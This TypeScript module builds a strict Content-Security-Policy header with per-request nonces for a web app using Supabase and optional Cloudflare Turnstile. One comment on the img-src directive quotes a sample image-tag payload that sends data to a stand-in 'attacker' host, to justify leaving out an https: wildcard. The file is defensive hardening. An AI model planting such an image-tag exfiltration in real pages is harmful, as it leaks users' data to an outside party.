import { readSupabaseUrl } from '@web/lib/supabase/env';

/**
 * Per-request Content-Security-Policy.
 *
 * - Strict script-src using a per-request nonce; no 'unsafe-inline' / 'unsafe-eval'.
 * - style-src keeps 'unsafe-inline' because Tailwind/Radix/framer-motion emit
 *   inline styles. Style-only XSS yield is dramatically smaller than script
 *   XSS, and tightening this further requires per-component refactor.
 * - connect-src restricted to self + Supabase (HTTP + WebSocket).
 * - frame-ancestors 'none' + base-uri 'self' + form-action 'self' to block
 *   clickjacking, base-tag hijack, and form-action redirects.
 */
export function buildCsp(nonce: string): string {
  const rawSupabaseUrl = readSupabaseUrl() ?? '';
  let supabaseHttp = 'https://*.supabase.co';
  let supabaseWs = 'wss://*.supabase.co';
  if (rawSupabaseUrl) {
    try {
      const parsed = new URL(rawSupabaseUrl);
      supabaseHttp = parsed.origin;
      supabaseWs = parsed.origin.replace(/^http/i, 'ws');
    } catch {
      const host = rawSupabaseUrl.replace(/^https?:\/\//, '');
      supabaseHttp = host ? `https://${host}` : supabaseHttp;
      supabaseWs = host ? `wss://${host}` : supabaseWs;
    }
  }

  // Cloudflare Turnstile (captcha) is opt-in via NEXT_PUBLIC_TURNSTILE_SITE_KEY.
  // When unset, we do not relax CSP at all.
  const turnstileEnabled = !!process.env.NEXT_PUBLIC_TURNSTILE_SITE_KEY;
  const turnstileScriptHosts = turnstileEnabled ? ['https://challenges.cloudflare.com'] : [];
  const turnstileFrameHosts = turnstileEnabled ? ['https://challenges.cloudflare.com'] : [];

  const directives: Record<string, string[]> = {
    'default-src': ["'self'"],
    'base-uri': ["'self'"],
    'form-action': ["'self'"],
    'frame-ancestors': ["'none'"],
    'object-src': ["'none'"],
    // No remote images are embedded. An https: wildcard here would let injected
    // markup exfiltrate data through <img src="https://attacker/?d=...">.
    'img-src': ["'self'", 'data:', 'blob:'],
    'font-src': ["'self'", 'data:'],
    'style-src': ["'self'", "'unsafe-inline'"],
    'script-src': [
      "'self'",
      `'nonce-${nonce}'`,
      // Next.js needs strict-dynamic to load chunked scripts that the
      // server inlines with the nonce. Older browsers fall back to nonce-only.
      "'strict-dynamic'",
      ...turnstileScriptHosts,
    ],
    'connect-src': ["'self'", supabaseHttp, supabaseWs, ...turnstileScriptHosts],
    'frame-src': ["'self'", ...turnstileFrameHosts],
    'manifest-src': ["'self'"],
    'worker-src': ["'self'", 'blob:'],
  };

  // In development Next emits eval'd HMR code; relax script-src only there.
  if (process.env.NODE_ENV !== 'production') {
    directives['script-src'].push("'unsafe-eval'");
  } else {
    directives['upgrade-insecure-requests'] = [];
  }

  return Object.entries(directives)
    .map(([k, v]) => (v.length ? `${k} ${v.join(' ')}` : k))
    .join('; ');
}

export function generateNonce(): string {
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);
  // base64url-style
  let bin = '';
  for (const b of bytes) bin += String.fromCharCode(b);
  return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}
